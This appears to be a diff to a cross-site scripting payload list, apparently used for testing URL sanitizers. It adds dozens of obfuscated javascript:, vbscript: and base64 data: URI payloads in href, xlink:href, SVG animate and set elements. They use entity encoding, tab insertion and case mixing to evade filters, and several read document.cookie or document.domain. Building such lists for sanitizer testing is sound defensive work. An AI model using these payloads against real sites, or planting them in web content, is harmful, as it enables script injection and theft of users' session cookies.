@@ -26,7 +26,7 @@ javaSCRIPT&colon;alert(1)
 JaVaScRipT:alert(1)
 javas&Tab;cript:\u0061lert(1);
 javascript:\u0061lert&#x28;1&#x29
-javascript&#x3A;alert&lpar;document&period;cookie&rpar; // AsharJaved
+javascript&#x3A;alert&lpar;document&period;cookie&rpar;
 vbscript:alert(1);
 vbscript&#00058;alert(1);
 vbscr&Tab;ipt:alert(1)"
@@ -41,3 +41,46 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 <object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik">10</object> 
 <button formaction="javascript:alert(11)">11</button> 
 <table background="javascript:alert(12)"><tr><tr>12</tr></tr></table> 
+<a xlink:href="javascript	:alert(document.domain)">test 7</a>
+<a xlink:href="javascrip	t:alert('0xd0ff9')">test 8</a>
+<a xlink:href="javas&tab;cript:alert(1)">test 7</a>
+<a xlink:href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">test 8</a>
+<a xlink:href="javascript&#00058;alert(1)">test 7</a>
+<a xlink:href="javaSCRIPT&colon;alert(1)">test 7</a>
+<a xlink:href="JaVaScRipT:alert(1)">test 7</a>
+<a xlink:href="javas&Tab;cript:\u0061lert(1);">test 7</a>
+<a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
+<animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a></svg>
+<set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<a href="javascript&#9;:alert(document.domain)">test 7</a>
+<a href="javascrip&#9;t:alert('0xd0ff9')">test 8</a>
+<a href="jAvaScript:alert(1)">1</a> 
+<a href="vbscript:alert(2)">2</a> 
+<a href="java\u0000script:alert(3)">3</a> 
+<a href="\njavascript:alert(4)">4</a> 
+<a href="java\nscript:alert(5)">5</a> 
+<a href="java\tscript:alert(6)">6</a> 
+<a href="%6aavascript:alert(7)">7</a> 
+<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik">8</a> 
+<a href=" dAt%61: tExt/html  ; bAse64 , PHN2Zy9vbmxvYWQ9YWxlcnQoMik">9</a> 
+<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik">10</object> 
+<button formaction="javascript:alert(11)">11</button> 
+<table background="javascript:alert(12)"><tr><tr>12</tr></tr></table> 
+<a href="mhtml:13">13</a> 
+<a xlink:href="jAvaScript:alert(1)">14</a> 
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"> 
+<a href="%E3%82%AA%E3%83%BC%E3%83">Invalid url</a>
+<a xlink:href="javascript:\u0061lert&#x28;1&#x29">test 7</a>
+<a xlink:href="javascript&#x3A;alert&lpar;document&period;cookie&rpar;">test 7</a>
+<a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">test 7</a>
+<a xlink:href="vbscript:alert(1);">test 7</a>
+<a xlink:href="vbscript&#00058;alert(1);">test 7</a>
+<a xlink:href="vbscr&Tab;ipt:alert(1)">test 7</a>
+<a xlink:href="j&#x26;#x26#x41;vascript:alert%252831337%2529">test 7</a>
+<a xlink:href="javascript&colon;alert&#40/1/&#41">test 7</a>
+<a xlink:href="javas&tab;cript:alert(1)">test 7</a>
+<a xlink:href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">test 7</a>
